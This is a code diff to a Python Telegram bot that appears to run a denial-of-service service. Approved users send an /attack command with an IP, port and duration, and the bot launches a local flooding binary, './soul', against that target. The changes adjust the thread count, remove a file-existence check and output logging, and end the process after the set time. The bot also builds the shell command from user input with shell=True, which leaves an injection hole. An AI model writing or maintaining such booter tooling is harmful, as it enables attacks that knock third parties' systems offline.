@@ -1,5 +1,4 @@
 import telebot
-import os
 import sqlite3
 from datetime import datetime, timedelta
 import subprocess
@@ -120,24 +119,11 @@ def send_telegram_message(chat_id, text):
 def attack_thread(ip, port, attack_time, attack_id):
     try:
         start_time = time.time()
+        command = f"./soul {ip} {port} {attack_time} 70"
+        process = subprocess.Popen(command, shell=True)
+        time.sleep(attack_time)  # Wait for attack time
 
-        command = f"./soul {ip} {port} {attack_time} 110"
-
-        process = subprocess.Popen(
-            command,
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True
-        )
-
-        stdout, stderr = process.communicate(timeout=attack_time + 5)
-
-        logger.info(f"soul stdout: {stdout}")
-        logger.error(f"soul stderr: {stderr}")
-        logger.info(f"soul return code: {process.returncode}")
-
-        
+        process.terminate()
         stop_attack(attack_id)
         end_time = time.time()
         add_log(f'Attack on IP {ip}, Port {port} has ended')
@@ -334,10 +320,6 @@ def attack(message):
     user_id = message.from_user.id
     log_command(user_id, '/attack')
 
-    if not os.path.exists("./soul"):
-        bot.reply_to(message, "soul file not found in current folder.")
-        return
-
     # Check if user is approved
     conn = sqlite3.connect('bot_data.db')
     c = conn.cursor()
@@ -348,6 +330,7 @@ def attack(message):
     if user_status is None or user_status[0] != 'approved':
         bot.reply_to(message, 'You are not approved to use this command.')
         return
+
 
     args = message.text.split()
     if len(args) != 4:
